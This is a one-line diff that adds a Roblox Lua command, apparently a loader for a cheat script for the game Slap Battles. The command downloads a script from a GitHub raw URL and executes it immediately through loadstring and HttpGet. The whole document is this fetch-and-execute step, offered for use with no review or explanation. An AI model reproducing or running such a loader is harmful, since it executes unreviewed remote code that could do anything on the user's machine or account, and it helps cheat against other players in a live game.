@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kaha4ik/Kaha4ikTop4ik/main/myscriptslapbattles", true))()
